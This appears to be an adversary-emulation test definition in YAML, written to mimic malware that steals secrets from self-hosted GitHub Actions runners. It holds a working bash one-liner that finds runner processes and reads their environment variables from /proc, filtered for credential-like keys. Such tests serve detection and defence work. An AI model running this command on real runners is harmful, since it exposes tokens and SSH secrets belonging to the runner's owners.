- name: Dump GitHub Actions Runner Environment Variables from procfs
  description: |
    Locates GitHub Actions runner processes (Runner.Worker, Runner.Listener, runsvc, run.sh)
    and reads their environment variables from /proc/<pid>/environ, filtering for keys
    containing "env" or "ssh". This mirrors TeamPCP malware behavior that harvests
    credentials and secrets from self-hosted runner processes.

    Reference: https://www.aquasec.com/blog/trivy-supply-chain-attack-what-you-need-to-know/
  supported_platforms:
  - linux
  executor:
    name: bash
    elevation_required: false
    command: |
      for pid in $(pgrep -f 'Runner.Worker|Runner.Listener|runsvc|run.sh' 2>/dev/null); do tr '\0' '\n' < /proc/$pid/environ 2>/dev/null | grep -iE 'env|ssh'; done
